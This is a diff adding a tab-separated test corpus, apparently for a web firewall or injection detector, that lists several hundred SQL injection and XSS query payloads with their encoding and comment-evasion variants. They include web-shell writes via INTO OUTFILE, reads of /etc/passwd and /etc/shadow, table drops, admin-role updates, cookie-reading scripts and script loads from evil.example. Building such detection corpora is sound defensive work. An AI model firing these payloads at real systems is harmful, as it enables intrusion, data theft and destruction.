@@ -1,0 +1,1112 @@
+category	method	path	query	ua	cookie	body	headers
+SQL	GET	/	id=1' OR '1'='1				
+SQL	GET	/	id=1 UNION SELECT username,password FROM users				
+SQL	GET	/	id=1 AND 1=1				
+SQL	GET	/	id=1 AND 1=2				
+SQL	GET	/	id=1; DROP TABLE users--				
+SQL	GET	/	id=1' AND SLEEP(5)--				
+SQL	GET	/	id=1 UNION/**/SELECT/**/1,2,3				
+SQL	GET	/	id=1 or 1=1				
+SQL	GET	/	id=1' or 'x'='x				
+SQL	GET	/	id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))				
+SQL	GET	/	id=1 AND (SELECT COUNT(*) FROM information_schema.tables)>0				
+SQL	GET	/	id=1 ORDER BY 100				
+SQL	GET	/	id=1 GROUP BY 1 HAVING 1=1				
+SQL	GET	/	id=1' WAITFOR DELAY '0:0:5'--				
+SQL	GET	/	id=1 INTO OUTFILE '/tmp/x'				
+SQL	GET	/	id=1 UNION ALL SELECT NULL,NULL,NULL--				
+SQL	GET	/	id=1' AND '1'='1' --				
+SQL	GET	/	id=1;SELECT pg_sleep(5)				
+SQL	GET	/	id=1 AND BENCHMARK(10000000,MD5(1))				
+SQL	GET	/	id=1 /*!50000UNION*/ SELECT 1				
+SQL	GET	/	id=1 AND/**/1=1				
+SQL	GET	/	id=1 UNION%0aSELECT 1,2,3				
+SQL	GET	/	id=1 UNION%09SELECT 1,2				
+SQL	GET	/	id=1 un/**/ion sel/**/ect 1				
+SQL	GET	/	id=1%27%20OR%20%271%27=%271				
+SQL	GET	/	id=1%2527%20OR%201%3D1				
+SQL	GET	/	id=1 UnIoN SeLeCt NULL				
+SQL	GET	/	id=1 OR 0x31=0x31				
+SQL	GET	/	id=1 OR TRUE				
+SQL	GET	/	id=1 AND 1 LIKE 1				
+SQL	GET	/	id=1 AND 1=1%23				
+SQL	GET	/	id=1; SELECT * FROM users				
+SQL	GET	/	id=1 AND @@version LIKE 0x38000000				
+SQL	GET	/	id=1 AND (SELECT 1 FROM sys.tables)				
+SQL	GET	/	id=1 OR CHAR(65)=CHAR(65)				
+SQL	GET	/	id=1 AND 1>0				
+SQL	GET	/	id=1 OR "1"="1"				
+SQL	GET	/	id=1 AND SLEEP(5)=0				
+SQL	GET	/	id=1 AND UPDATEXML(1,CONCAT(1,0x7e),1)				
+SQL	GET	/	id=1 order by 1,2,3,4,5,6,7,8,9,10				
+SQL	GET	/	id=1 group by 1 having 1>0				
+SQL	GET	/	id=1; DROP TABLE t--				
+SQL	GET	/	id=1 AND MID(@@version,1,1)='5'				
+SQL	GET	/	id=1 AND SUBSTRING((SELECT database()),1,1)>0				
+SQL	GET	/	id=1 AND load_file('/etc/passwd')				
+SQL	GET	/	id=1 /*!50000AND*/ 1=1				
+SQL	GET	/	id=1%0aAND%201=1				
+SQL	GET	/	id=1 AND (SELECT 1 FROM users WHERE 1=1)				
+SQL	GET	/	id=1' OR 'a'='a				
+SQL	GET	/	id=1 AND EXISTS(SELECT 1 FROM information_schema.tables)				
+SQL	GET	/	id=1 AND 1 LIKE 1				
+SQL	GET	/	id=1 OR 'a'='a				
+SQL	GET	/	id=1' AND '1' LIKE '				
+SQL	GET	/	id=1 AND ASCII(SUBSTR((SELECT database()),1,1))>64				
+SQL	GET	/	id=1 AND SUBSTR((SELECT version()),1,1)='5'				
+SQL	GET	/	id=1 AND (SELECT 1 FROM dual)=1				
+SQL	GET	/	id=1 UNION SELECT 1,2,3,4				
+SQL	GET	/	id=1 UNION ALL SELECT NULL,NULL				
+SQL	GET	/	id=-1%20UNION%20SELECT%20@@version				
+SQL	GET	/	id=1 UNION SELECT database()				
+SQL	GET	/	id=1 AND @@version LIKE '5%'				
+SQL	GET	/	id=1 AND version() LIKE '8%'				
+SQL	GET	/	id=1 AND SLEEP(5)=0				
+SQL	GET	/	id=1 AND BENCHMARK(1000000,MD5(1))				
+SQL	GET	/	id=1'%20AND%20(SELECT%201%20FROM%20(SELECT%20SLEEP(5))x)--				
+SQL	GET	/	id=1; WAITFOR DELAY '00:00:05'				
+SQL	GET	/	id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))				
+SQL	GET	/	id=1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)				
+SQL	GET	/	id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)				
+SQL	GET	/	id=1 AND 1=1 ORDER BY 1				
+SQL	GET	/	id=1 ORDER BY 1--				
+SQL	GET	/	id=1 AND LOAD_FILE('/etc/passwd')				
+SQL	GET	/	id=1 UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/shell.php'				
+SQL	GET	/	id=1; INSERT INTO users VALUES('x','y')				
+SQL	GET	/	id=1; UPDATE users SET role='admin'				
+SQL	GET	/	id=1; DELETE FROM users WHERE 1=1				
+SQL	GET	/	id=1 AND pg_catalog.pg_tables IS NOT NULL				
+SQL	GET	/	id=1 AND sqlite_master IS NOT NULL				
+SQL	GET	/	id=1 AND sys.tables IS NOT NULL				
+SQL	GET	/	id=1 AND information_schema.tables IS NOT NULL				
+SQL	GET	/	id=1 AND 1=1 /*				
+SQL	GET	/	id=1 AND 1=1 #				
+SQL	GET	/	id=1 /*!50000UNION*/ SELECT 1				
+SQL	GET	/	id=1%20%bf%27%20AND%201=1				
+SQL	GET	/	id=1%2527%20OR%201=1				
+SQL	GET	/	id=1 sElEcT * fRoM uSeRs				
+SQL	GET	/	id=1 UNION/**/SELECT/**/NULL				
+SQL	GET	/	id=1' or '1'='1' or '				
+SQL	GET	/	id=1 AND (1)=(1)				
+SQL	GET	/	id=1 AND 0x31=0x31				
+SQL	GET	/	id=1' AND 1=1 AND 'x'='x				
+SQL	GET	/	id=1 AND 2>1				
+SQL	GET	/	id=1 AND 1 IS NOT NULL				
+SQL	GET	/	id=1 XOR 1=1				
+SQL	GET	/	id=1 AND EXISTS(SELECT 1 FROM users)				
+SQL	GET	/	id=1 AND 1=(SELECT 1)				
+SQL	GET	/	id=1; SELECT * FROM information_schema.tables				
+SQL	GET	/	id=1%20AND%20%CHAR(65)%3DCHAR(65)				
+SQL	GET	/	id=1 AND SUBSTRING((SELECT database()),1,1)>0				
+SQL	GET	/	id=1 AND (SELECT COUNT(*) FROM sys.objects)>0				
+SQL	GET	/	id=1 AND 1=1-- 				
+SQL	GET	/	id=1 AND 1=2-- 				
+SQL	GET	/	id=1 AND 1=2 #				
+SQL	GET	/	id=1 AND 1=2 /*				
+SQL	GET	/	id=1 AND 2>1-- 				
+SQL	GET	/	id=1 AND 2>1 #				
+SQL	GET	/	id=1 AND 2>1 /*				
+SQL	GET	/	id=1 AND 'a'='a				
+SQL	GET	/	id=1 AND 'a'='a-- 				
+SQL	GET	/	id=1 AND 'a'='a #				
+SQL	GET	/	id=1 AND 'a'='a /*				
+SQL	GET	/	id=1 AND 1 LIKE 1-- 				
+SQL	GET	/	id=1 AND 1 LIKE 1 #				
+SQL	GET	/	id=1 AND 1 LIKE 1 /*				
+SQL	GET	/	id=1 AND 1 IS NOT NULL-- 				
+SQL	GET	/	id=1 AND 1 IS NOT NULL #				
+SQL	GET	/	id=1 AND 1 IS NOT NULL /*				
+SQL	GET	/	id=1 AND (1)=(1)-- 				
+SQL	GET	/	id=1 AND (1)=(1) #				
+SQL	GET	/	id=1 AND (1)=(1) /*				
+SQL	GET	/	id=1 AND 0x31=0x31-- 				
+SQL	GET	/	id=1 AND 0x31=0x31 #				
+SQL	GET	/	id=1 AND 0x31=0x31 /*				
+SQL	GET	/	id=1 OR 1=1				
+SQL	GET	/	id=1 OR 1=1-- 				
+SQL	GET	/	id=1 OR 1=1 #				
+SQL	GET	/	id=1 OR 1=1 /*				
+SQL	GET	/	id=1 OR 1=2				
+SQL	GET	/	id=1 OR 1=2-- 				
+SQL	GET	/	id=1 OR 1=2 #				
+SQL	GET	/	id=1 OR 1=2 /*				
+SQL	GET	/	id=1 OR 2>1				
+SQL	GET	/	id=1 OR 2>1-- 				
+SQL	GET	/	id=1 OR 2>1 #				
+SQL	GET	/	id=1 OR 2>1 /*				
+SQL	GET	/	id=1 OR 'a'='a-- 				
+SQL	GET	/	id=1 OR 'a'='a #				
+SQL	GET	/	id=1 OR 'a'='a /*				
+SQL	GET	/	id=1 OR 1 LIKE 1				
+SQL	GET	/	id=1 OR 1 LIKE 1-- 				
+SQL	GET	/	id=1 OR 1 LIKE 1 #				
+SQL	GET	/	id=1 OR 1 LIKE 1 /*				
+SQL	GET	/	id=1 OR 1 IS NOT NULL				
+SQL	GET	/	id=1 OR 1 IS NOT NULL-- 				
+SQL	GET	/	id=1 OR 1 IS NOT NULL #				
+SQL	GET	/	id=1 OR 1 IS NOT NULL /*				
+SQL	GET	/	id=1 OR (1)=(1)				
+SQL	GET	/	id=1 OR (1)=(1)-- 				
+SQL	GET	/	id=1 OR (1)=(1) #				
+SQL	GET	/	id=1 OR (1)=(1) /*				
+SQL	GET	/	id=1 OR 0x31=0x31-- 				
+SQL	GET	/	id=1 OR 0x31=0x31 #				
+SQL	GET	/	id=1 OR 0x31=0x31 /*				
+SQL	GET	/	id=1 XOR 1=1-- 				
+SQL	GET	/	id=1 XOR 1=1 #				
+SQL	GET	/	id=1 XOR 1=1 /*				
+SQL	GET	/	id=1 XOR 1=2				
+SQL	GET	/	id=1 XOR 1=2-- 				
+SQL	GET	/	id=1 XOR 1=2 #				
+SQL	GET	/	id=1 XOR 1=2 /*				
+SQL	GET	/	id=1 XOR 2>1				
+SQL	GET	/	id=1 XOR 2>1-- 				
+SQL	GET	/	id=1 XOR 2>1 #				
+SQL	GET	/	id=1 XOR 2>1 /*				
+SQL	GET	/	id=1 XOR 'a'='a				
+SQL	GET	/	id=1 XOR 'a'='a-- 				
+SQL	GET	/	id=1 XOR 'a'='a #				
+SQL	GET	/	id=1 XOR 'a'='a /*				
+SQL	GET	/	id=1 XOR 1 LIKE 1				
+SQL	GET	/	id=1 XOR 1 LIKE 1-- 				
+SQL	GET	/	id=1 XOR 1 LIKE 1 #				
+SQL	GET	/	id=1 XOR 1 LIKE 1 /*				
+SQL	GET	/	id=1 XOR 1 IS NOT NULL				
+SQL	GET	/	id=1 XOR 1 IS NOT NULL-- 				
+SQL	GET	/	id=1 XOR 1 IS NOT NULL #				
+SQL	GET	/	id=1 XOR 1 IS NOT NULL /*				
+SQL	GET	/	id=1 XOR (1)=(1)				
+SQL	GET	/	id=1 XOR (1)=(1)-- 				
+SQL	GET	/	id=1 XOR (1)=(1) #				
+SQL	GET	/	id=1 XOR (1)=(1) /*				
+SQL	GET	/	id=1 XOR 0x31=0x31				
+SQL	GET	/	id=1 XOR 0x31=0x31-- 				
+SQL	GET	/	id=1 XOR 0x31=0x31 #				
+SQL	GET	/	id=1 XOR 0x31=0x31 /*				
+SQL	GET	/	id=1 UNION SELECT 1				
+SQL	GET	/	id=1 UNION ALL SELECT 1-- 				
+SQL	GET	/	id=-1%20UNION%20SELECT%201				
+SQL	GET	/	id=1 UNION SELECT 1,NULL				
+SQL	GET	/	id=1 UNION ALL SELECT 1,NULL-- 				
+SQL	GET	/	id=-1%20UNION%20SELECT%201%2CNULL				
+SQL	GET	/	id=1 UNION SELECT 1,NULL,3				
+SQL	GET	/	id=1 UNION ALL SELECT 1,NULL,3-- 				
+SQL	GET	/	id=-1%20UNION%20SELECT%201%2CNULL%2C3				
+SQL	GET	/	id=1 UNION SELECT 1,NULL,3,NULL				
+SQL	GET	/	id=1 UNION ALL SELECT 1,NULL,3,NULL-- 				
+SQL	GET	/	id=-1%20UNION%20SELECT%201%2CNULL%2C3%2CNULL				
+SQL	GET	/	id=1 UNION SELECT 1,NULL,3,NULL,5				
+SQL	GET	/	id=1 UNION ALL SELECT 1,NULL,3,NULL,5-- 				
+SQL	GET	/	id=-1%20UNION%20SELECT%201%2CNULL%2C3%2CNULL%2C5				
+SQL	GET	/	id=1 UNION SELECT 1,NULL,3,NULL,5,NULL				
+SQL	GET	/	id=1 UNION ALL SELECT 1,NULL,3,NULL,5,NULL-- 				
+SQL	GET	/	id=-1%20UNION%20SELECT%201%2CNULL%2C3%2CNULL%2C5%2CNULL				
+SQL	GET	/	id=1 AND SLEEP(5)				
+SQL	GET	/	id=1 AND SLEEP(5)'				
+SQL	GET	/	id=1 AND SLEEP(5))				
+SQL	GET	/	id=1 AND SLEEP(5)))				
+SQL	GET	/	id=1 AND SLEEP(3)				
+SQL	GET	/	id=1 AND SLEEP(3)'				
+SQL	GET	/	id=1 AND SLEEP(3))				
+SQL	GET	/	id=1 AND SLEEP(3)))				
+SQL	GET	/	id=1 AND BENCHMARK(10000000,MD5(1))'				
+SQL	GET	/	id=1 AND BENCHMARK(10000000,MD5(1)))				
+SQL	GET	/	id=1 AND BENCHMARK(10000000,MD5(1))))				
+SQL	GET	/	id=1 AND pg_sleep(5)				
+SQL	GET	/	id=1 AND pg_sleep(5)'				
+SQL	GET	/	id=1 AND pg_sleep(5))				
+SQL	GET	/	id=1 AND pg_sleep(5)))				
+SQL	GET	/	id=1 AND WAITFOR DELAY '0:0:5'				
+SQL	GET	/	id=1 AND WAITFOR DELAY '0:0:5''				
+SQL	GET	/	id=1 AND WAITFOR DELAY '0:0:5')				
+SQL	GET	/	id=1 AND WAITFOR DELAY '0:0:5'))				
+SQL	GET	/	id=1 AND DBMS_LOCK.SLEEP(5)				
+SQL	GET	/	id=1 AND DBMS_LOCK.SLEEP(5)'				
+SQL	GET	/	id=1 AND DBMS_LOCK.SLEEP(5))				
+SQL	GET	/	id=1 AND DBMS_LOCK.SLEEP(5)))				
+SQL	GET	/	id=1 AND (EXTRACTVALUE(1,CONCAT(0x7e,version()))				
+SQL	GET	/	id=1 OR EXTRACTVALUE(1,CONCAT(0x7e,version()))				
+SQL	GET	/	id=1 AND UPDATEXML(1,CONCAT(0x7e,database()),1)				
+SQL	GET	/	id=1 AND (UPDATEXML(1,CONCAT(0x7e,database()),1)				
+SQL	GET	/	id=1 OR UPDATEXML(1,CONCAT(0x7e,database()),1)				
+SQL	GET	/	id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))				
+SQL	GET	/	id=1 AND (EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))				
+SQL	GET	/	id=1 OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))				
+SQL	GET	/	id=1 UNION SELECT * FROM information_schema.tables				
+SQL	GET	/	id=1 AND information_schema.columns IS NOT NULL				
+SQL	GET	/	id=1 AND (SELECT COUNT(*) FROM information_schema.columns)>0				
+SQL	GET	/	id=1 UNION SELECT * FROM information_schema.columns				
+SQL	GET	/	id=1 AND (SELECT COUNT(*) FROM pg_catalog.pg_tables)>0				
+SQL	GET	/	id=1 UNION SELECT * FROM pg_catalog.pg_tables				
+SQL	GET	/	id=1 AND (SELECT COUNT(*) FROM sqlite_master)>0				
+SQL	GET	/	id=1 UNION SELECT * FROM sqlite_master				
+SQL	GET	/	id=1 AND (SELECT COUNT(*) FROM sys.tables)>0				
+SQL	GET	/	id=1 UNION SELECT * FROM sys.tables				
+SQL	GET	/	id=1 AND sys.objects IS NOT NULL				
+SQL	GET	/	id=1 UNION SELECT * FROM sys.objects				
+SQL	GET	/	id=1 AND mysql.user IS NOT NULL				
+SQL	GET	/	id=1 AND (SELECT COUNT(*) FROM mysql.user)>0				
+SQL	GET	/	id=1 UNION SELECT * FROM mysql.user				
+SQL	GET	/	id=1 AND dual IS NOT NULL				
+SQL	GET	/	id=1 AND (SELECT COUNT(*) FROM dual)>0				
+SQL	GET	/	id=1 UNION SELECT * FROM dual				
+SQL	GET	/	id=1 AND LOAD_FILE('/etc/shadow')				
+SQL	GET	/	id=1 UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/tmp/a.php'				
+SQL	GET	/	id=1 UNION SELECT '<?php system($_GET[c]);?>' INTO DUMPFILE '/tmp/b.bin'				
+SQL	GET	/	id=1; INSERT INTO users VALUES('a','b')				
+SQL	GET	/	id=1%3B%20INSERT%20INTO%20users%20VALUES%28%27a%27%2C%27b%27%29				
+SQL	GET	/	id=1%3B%20UPDATE%20users%20SET%20role%3D%27admin%27				
+SQL	GET	/	id=1%3B%20DELETE%20FROM%20users%20WHERE%201%3D1				
+SQL	GET	/	id=1; DROP TABLE users				
+SQL	GET	/	id=1%3B%20DROP%20TABLE%20users				
+SQL	GET	/	id=1; CREATE TABLE x(a int)				
+SQL	GET	/	id=1%3B%20CREATE%20TABLE%20x%28a%20int%29				
+SQL	GET	/	id=1; ALTER TABLE users ADD x int				
+SQL	GET	/	id=1%3B%20ALTER%20TABLE%20users%20ADD%20x%20int				
+SQL	GET	/	id=1; TRUNCATE TABLE users				
+SQL	GET	/	id=1%3B%20TRUNCATE%20TABLE%20users				
+SQL	GET	/	id=1 union select 1				
+SQL	GET	/	id=1 uNiOn sElEcT 1				
+SQL	GET	/	id=1 UNION/**/SELECT/**/1				
+SQL	GET	/	id=1 UNION%20%20SELECT%20%201				
+SQL	GET	/	id=1 UNION%20SELECT%201				
+SQL	GET	/	id=1 UNION%2520SELECT%25201				
+SQL	GET	/	id=1 /*!50000UNIONSELECT1*/				
+SQL	GET	/	id=1 %bf%27UNION%20SELECT%201				
+SQL	GET	/	id=1 %df%27UNION%20SELECT%201				
+SQL	GET	/	id=1 oR 1=1				
+SQL	GET	/	id=1 OR/**/1=1				
+SQL	GET	/	id=1 OR%20%201=1				
+SQL	GET	/	id=1 OR%201%3D1				
+SQL	GET	/	id=1 OR%25201%253D1				
+SQL	GET	/	id=1 /*!50000OR1=1*/				
+SQL	GET	/	id=1 %bf%27OR%201%3D1				
+SQL	GET	/	id=1 %df%27OR%201%3D1				
+SQL	GET	/	id=1 and 1=1				
+SQL	GET	/	id=1 aNd 1=1				
+SQL	GET	/	id=1 AND%20%201=1				
+SQL	GET	/	id=1 AND%201%3D1				
+SQL	GET	/	id=1 AND%25201%253D1				
+SQL	GET	/	id=1 /*!50000AND1=1*/				
+SQL	GET	/	id=1 %bf%27AND%201%3D1				
+SQL	GET	/	id=1 %df%27AND%201%3D1				
+SQL	GET	/	id=1 SELECT * FROM USERS				
+SQL	GET	/	id=1 select * from users				
+SQL	GET	/	id=1 sElEcT * FrOm uSeRs				
+SQL	GET	/	id=1 SELECT/**/*/**/FROM/**/users				
+SQL	GET	/	id=1 SELECT%20%20*%20%20FROM%20%20users				
+SQL	GET	/	id=1 SELECT%20%2A%20FROM%20users				
+SQL	GET	/	id=1 SELECT%2520%252A%2520FROM%2520users				
+SQL	GET	/	id=1 /*!50000SELECT*FROMusers*/				
+SQL	GET	/	id=1 %bf%27SELECT%20%2A%20FROM%20users				
+SQL	GET	/	id=1 %df%27SELECT%20%2A%20FROM%20users				
+SQL	GET	/	id=1 SLEEP(5)				
+SQL	GET	/	id=1 sleep(5)				
+SQL	GET	/	id=1 sLeEp(5)				
+SQL	GET	/	id=1 SLEEP%285%29				
+SQL	GET	/	id=1 SLEEP%25285%2529				
+SQL	GET	/	id=1 /*!50000SLEEP(5)*/				
+SQL	GET	/	id=1 %bf%27SLEEP%285%29				
+SQL	GET	/	id=1 %df%27SLEEP%285%29				
+SQL	GET	/	id=1 AND CHAR(65)=1				
+SQL	GET	/	id=1 AND CHAR(65)>0				
+SQL	GET	/	id=1 AND CHAR(0x41)=1				
+SQL	GET	/	id=1 AND CHAR(0x41)>0				
+SQL	GET	/	id=1 AND CHR(65)=1				
+SQL	GET	/	id=1 AND CHR(65)>0				
+SQL	GET	/	id=1 AND ASCII('A')=1				
+SQL	GET	/	id=1 AND ASCII('A')>0				
+SQL	GET	/	id=1 AND SUBSTRING('abc',1,1)=1				
+SQL	GET	/	id=1 AND SUBSTRING('abc',1,1)>0				
+SQL	GET	/	id=1 AND SUBSTR((SELECT database()),1,1)=1				
+SQL	GET	/	id=1 AND SUBSTR((SELECT database()),1,1)>0				
+SQL	GET	/	id=1 AND MID((SELECT version()),1,1)=1				
+SQL	GET	/	id=1 AND MID((SELECT version()),1,1)>0				
+XSS	GET	/	q=<script>alert(1)</script>				
+XSS	GET	/	q=<img src=x onerror=alert(1)>				
+XSS	GET	/	q=<svg/onload=alert(1)>				
+XSS	GET	/	q=javascript:alert(1)				
+XSS	GET	/	q=<iframe src=javascript:alert(1)>				
+XSS	GET	/	q=<body onload=alert(1)>				
+XSS	GET	/	q=<a href=javascript:alert(1)>click</a>				
+XSS	GET	/	q=%3Cscript%3Ealert(1)%3C/script%3E				
+XSS	GET	/	q=<script>document.cookie</script>				
+XSS	GET	/	q=<img src="x" onerror="alert(document.domain)">				
+XSS	GET	/	q=<details open ontoggle=alert(1)>				
+XSS	GET	/	q=<input autofocus onfocus=alert(1)>				
+XSS	GET	/	q=<video><source onerror=alert(1)>				
+XSS	GET	/	q=<object data=javascript:alert(1)>				
+XSS	GET	/	q=<embed src=javascript:alert(1)>				
+XSS	GET	/	q=<form action=javascript:alert(1)><input type=submit>				
+XSS	GET	/	q=<style>@import 'javascript:alert(1)'</style>				
+XSS	GET	/	q=</script><script>alert(1)</script>				
+XSS	GET	/	q=<math><mtext><script>alert(1)</script></mtext></math>				
+XSS	GET	/	q=<script src=//evil.example/x.js></script>				
+XSS	GET	/	q=<svg onload=alert(1)>				
+XSS	GET	/	q=<math href=javascript:alert(1)>x</math>				
+XSS	GET	/	q=<iframe srcdoc=<script>alert(1)</script>>				
+XSS	GET	/	q=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==				
+XSS	GET	/	q=<template><script>alert(1)</script></template>				
+XSS	GET	/	q=<base href=javascript:alert(1)//>				
+XSS	GET	/	q=<div style=background:url(javascript:alert(1))>				
+XSS	GET	/	q=<style>@import url(//evil.example/x.css)</style>				
+XSS	GET	/	q=<object data=data:text/html,<script>alert(1)</script>>				
+XSS	GET	/	q=<svg><script>alert(1)</script></svg>				
+XSS	GET	/	q=<SCRIPT>alert(1)</SCRIPT>				
+XSS	GET	/	q=<img src=x onerror=alert&#40;1&#41;>				
+XSS	GET	/	q=document.cookie				
+XSS	GET	/	q=javascript:alert(document.domain)				
+XSS	GET	/	q=<marquee onstart=alert(1)>				
+XSS	GET	/	q=<video poster=javascript:alert(1)>				
+XSS	GET	/	q=<form><button formaction=javascript:alert(1)>X</button>				
+XSS	GET	/	q=<input type=image src=javascript:alert(1)>				
+XSS	GET	/	q=<link rel=stylesheet href=javascript:alert(1)>				
+XSS	GET	/	q=<meta http-equiv=refresh content=0;url=javascript:alert(1)>				
+XSS	GET	/	q=<body background=javascript:alert(1)>				
+XSS	GET	/	q=<svg><animate onbegin=alert(1) attributeName=x dur=1s>				
+XSS	GET	/	q=eval(alert(1))				
+XSS	GET	/	q=%3Csvg%20onload%3Dalert%281%29%3E				
+XSS	GET	/	q=<xss style=x:expression(alert(1))>				
+XSS	GET	/	q=<noscript><p title=</noscript><img src=x onerror=alert(1)>>				
+XSS	GET	/	q=<a href=javascript:alert(1)>click</a>				
+XSS	GET	/	q=<details open ontoggle=alert(1)>				
+XSS	GET	/	q=<svg/onload=alert(1)>				
+XSS	GET	/	q=<object data=javascript:alert(1)>				
+XSS	GET	/	q=<script>alert(document.cookie)</script>				
+XSS	GET	/	q=<script src=//evil.example/x.js></script>				
+XSS	GET	/	q=<img src=x onerror=alert`1`>				
+XSS	GET	/	q=<svg onload=alert(1)//>				
+XSS	GET	/	q=<body/onload=alert(1)>				
+XSS	GET	/	q=<video><source onerror=alert(1)>				
+XSS	GET	/	q=<audio src=x onerror=alert(1)>				
+XSS	GET	/	q=<marquee onstart=alert(1)>				
+XSS	GET	/	q=<input autofocus onfocus=alert(1)>				
+XSS	GET	/	q=<select autofocus onfocus=alert(1)>				
+XSS	GET	/	q=<textarea autofocus onfocus=alert(1)>				
+XSS	GET	/	q=<keygen autofocus onfocus=alert(1)>				
+XSS	GET	/	q=<form><button formaction=javascript:alert(1)>x</button></form>				
+XSS	GET	/	q=<isindex action=javascript:alert(1) type=image>				
+XSS	GET	/	q=<a href=javascript:alert(1)>x</a>				
+XSS	GET	/	q=<a href="javascript&colon;alert(1)">x</a>				
+XSS	GET	/	q=<iframe srcdoc="<script>alert(1)</script>">				
+XSS	GET	/	q=<object data=javascript:alert(1)>				
+XSS	GET	/	q=<embed src=javascript:alert(1)>				
+XSS	GET	/	q=<svg><script>alert(1)</script></svg>				
+XSS	GET	/	q=<svg><animate onbegin=alert(1)>				
+XSS	GET	/	q=<svg><set attributeName=onmouseover to=alert(1)>				
+XSS	GET	/	q=<style>@import "javascript:alert(1)";</style>				
+XSS	GET	/	q=<link rel=stylesheet href=javascript:alert(1)>				
+XSS	GET	/	q=%3Csvg%20onload%3Dalert(1)%3E				
+XSS	GET	/	q=%253Cscript%253Ealert(1)%253C%252Fscript%253E				
+XSS	GET	/	q=&lt;script&gt;alert(1)&lt;/script&gt;				
+XSS	GET	/	q=&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;				
+XSS	GET	/	q=<img src="x" onerror="alert(1)">				
+XSS	GET	/	q=<img src=x ONERROR=alert(1)>				
+XSS	GET	/	q=<img/src=x/onerror=alert(1)>				
+XSS	GET	/	q=<img src=x onerror=alert(String.fromCharCode(88))>				
+XSS	GET	/	q="><script>alert(1)</script>				
+XSS	GET	/	q='><script>alert(1)</script>				
+XSS	GET	/	q=javascript:alert(1)//				
+XSS	GET	/	q=data:text/html,<script>alert(1)</script>				
+XSS	GET	/	q=vbscript:msgbox(1)				
+XSS	GET	/	q=<script>eval(atob('YWxlcnQoMSk='))</script>				
+XSS	GET	/	q=<img src=x onerror=eval(name)>				
+XSS	GET	/	q=<svg><![CDATA[<script>alert(1)</script>]]></svg>				
+XSS	GET	/	q=${alert(1)}				
+XSS	GET	/	q=<div style="background:url(javascript:alert(1))">				
+XSS	GET	/	q=<iframe src=//evil.example onload=alert(1)>				
+XSS	GET	/	q=<frameset onload=alert(1)>				
+XSS	GET	/	q=<template><script>alert(1)</script></template>				
+XSS	GET	/	q=<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">				
+XSS	GET	/	q=<noscript><p title="</noscript><img src=x onerror=alert(1)>">				
+XSS	GET	/	q=<svg><use href="data:image/svg+xml,<svg id='x' onload=alert(1)>" />				
+XSS	GET	/	q=<html><body onload=alert(1)></body></html>				
+XSS	GET	/	q=<script>alert(1)</script%3E				
+XSS	GET	/	q=<script onerror=alert(1)>				
+XSS	GET	/	q=<script/onerror=alert(1)>				
+XSS	GET	/	q=<script src=x onerror=alert(1)>				
+XSS	GET	/	q=<script onload=alert(1)>				
+XSS	GET	/	q=<script/onload=alert(1)>				
+XSS	GET	/	q=<script src=x onload=alert(1)>				
+XSS	GET	/	q=<script onfocus=alert(1)>				
+XSS	GET	/	q=<script/onfocus=alert(1)>				
+XSS	GET	/	q=<script src=x onfocus=alert(1)>				
+XSS	GET	/	q=<script ontoggle=alert(1)>				
+XSS	GET	/	q=<script/ontoggle=alert(1)>				
+XSS	GET	/	q=<script src=x ontoggle=alert(1)>				
+XSS	GET	/	q=<script onmouseover=alert(1)>				
+XSS	GET	/	q=<script/onmouseover=alert(1)>				
+XSS	GET	/	q=<script src=x onmouseover=alert(1)>				
+XSS	GET	/	q=<script onclick=alert(1)>				
+XSS	GET	/	q=<script/onclick=alert(1)>				
+XSS	GET	/	q=<script src=x onclick=alert(1)>				
+XSS	GET	/	q=<script onstart=alert(1)>				
+XSS	GET	/	q=<script/onstart=alert(1)>				
+XSS	GET	/	q=<script src=x onstart=alert(1)>				
+XSS	GET	/	q=<script onbegin=alert(1)>				
+XSS	GET	/	q=<script/onbegin=alert(1)>				
+XSS	GET	/	q=<script src=x onbegin=alert(1)>				
+XSS	GET	/	q=<script onanimationstart=alert(1)>				
+XSS	GET	/	q=<script/onanimationstart=alert(1)>				
+XSS	GET	/	q=<script src=x onanimationstart=alert(1)>				
+XSS	GET	/	q=<script onpointerover=alert(1)>				
+XSS	GET	/	q=<script/onpointerover=alert(1)>				
+XSS	GET	/	q=<script src=x onpointerover=alert(1)>				
+XSS	GET	/	q=<script onwheel=alert(1)>				
+XSS	GET	/	q=<script/onwheel=alert(1)>				
+XSS	GET	/	q=<script src=x onwheel=alert(1)>				
+XSS	GET	/	q=<img onerror=alert(1)>				
+XSS	GET	/	q=<img/onerror=alert(1)>				
+XSS	GET	/	q=<img onload=alert(1)>				
+XSS	GET	/	q=<img/onload=alert(1)>				
+XSS	GET	/	q=<img src=x onload=alert(1)>				
+XSS	GET	/	q=<img onfocus=alert(1)>				
+XSS	GET	/	q=<img/onfocus=alert(1)>				
+XSS	GET	/	q=<img src=x onfocus=alert(1)>				
+XSS	GET	/	q=<img ontoggle=alert(1)>				
+XSS	GET	/	q=<img/ontoggle=alert(1)>				
+XSS	GET	/	q=<img src=x ontoggle=alert(1)>				
+XSS	GET	/	q=<img onmouseover=alert(1)>				
+XSS	GET	/	q=<img/onmouseover=alert(1)>				
+XSS	GET	/	q=<img src=x onmouseover=alert(1)>				
+XSS	GET	/	q=<img onclick=alert(1)>				
+XSS	GET	/	q=<img/onclick=alert(1)>				
+XSS	GET	/	q=<img src=x onclick=alert(1)>				
+XSS	GET	/	q=<img onstart=alert(1)>				
+XSS	GET	/	q=<img/onstart=alert(1)>				
+XSS	GET	/	q=<img src=x onstart=alert(1)>				
+XSS	GET	/	q=<img onbegin=alert(1)>				
+XSS	GET	/	q=<img/onbegin=alert(1)>				
+XSS	GET	/	q=<img src=x onbegin=alert(1)>				
+XSS	GET	/	q=<img onanimationstart=alert(1)>				
+XSS	GET	/	q=<img/onanimationstart=alert(1)>				
